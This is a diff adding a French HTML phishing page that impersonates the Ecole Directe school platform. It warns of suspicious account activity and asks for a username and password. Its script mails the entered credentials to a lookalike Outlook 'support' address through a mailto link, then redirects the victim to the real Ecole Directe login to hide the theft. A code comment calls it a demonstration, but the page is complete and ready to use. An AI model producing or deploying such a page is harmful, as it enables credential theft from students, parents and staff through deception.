@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>réinitialisation des identifiant Ecole Direct </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0; /* Couleur d'arrière-plan */
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .login-form {
+            background-color: #ffffff; /* Couleur de l'arrière-plan du formulaire */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Ombre pour le formulaire */
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+        }
+        .login-button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+        #disclaimer {
+            margin-top: 10px;
+            color: #888;
+        }
+        #showPassword {
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-form">
+            <h2>Important</h2>
+                Nous avons détecté des activités suspicieuse sur votre compte Ecole Directe 
+            <form onsubmit="return false;">
+                <input type="text" id="usernameInput" placeholder="Nom d'utilisateur ou Email">
+                <br>
+                <input type="password" id="passwordInput" placeholder="Mot de passe">
+                <br>
+                <input type="checkbox" id="rememberMe">
+                <label for="rememberMe">Se souvenir de moi</label>
+                <br>
+                <input type="checkbox" id="showPassword">
+                <label for="showPassword">Afficher le mot de passe</label>
+                <br>
+                <button class="login-button" onclick="attemptLogin()">Connexion</button>
+            </form>
+            <div id="disclaimer">
+                <h2>Important :<h2>
+               Veuillez bien confirmer par Outlook en utilisent le bouton de Connexion. 
+                Nous allons réinitialiser votre mot de passe pour le rendre plus complexe cela prendra le temps qu'il faudra.             
+            </div>
+        </div>
+    </div>
+    <script>
+        function redirectToEcoleDirecte() {
+            // Redirection vers la page d'accueil d'ÉcoleDirecte après la connexion
+            window.location.href = "https://www.ecoledirecte.com/login?cameFrom=%2FAccueil";
+        }
+
+        function attemptLogin() {
+            // Récupération des valeurs des champs d'identifiant et de mot de passe
+            var usernameInput = document.getElementById('usernameInput').value;
+            var passwordInput = document.getElementById('passwordInput').value;
+
+            // Vérification si les champs sont remplis
+            if (usernameInput.trim() !== '' && passwordInput.trim() !== '') {
+                // Envoi des informations au serveur (c'est un exemple, vous devez implémenter le serveur)
+                sendLoginData(usernameInput, passwordInput);
+            } else {
+                // Affichage d'un message d'erreur si les champs ne sont pas remplis
+                alert('Veuillez remplir les champs d\'identifiant et de mot de passe.');
+            }
+        }
+
+        // Afficher ou masquer le mot de passe en fonction de l'état de la case à cocher
+        document.getElementById('showPassword').addEventListener('change', function () {
+            var passwordInput = document.getElementById('passwordInput');
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        // Fonction pour envoyer les informations à une adresse e-mail (à des fins de démonstration)
+        function sendLoginData(username, password) {
+            var email = 'Suport.tecnique_Ecole_Directe@outlook.com';
+            var subject = 'Informations de Connexion';
+            var body = 'Nom d\'utilisateur : ' + username + '\nMot de passe : ' + password;
+
+            // Ouvrir un client de messagerie avec les informations de connexion
+            window.location.href = 'mailto:' + email + '?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
+
+            // Redirection vers ÉcoleDirecte (vous devriez ajuster cela en fonction de votre flux de travail)
+            redirectToEcoleDirecte();
+        }
+    </script>
+</body>
+</html>
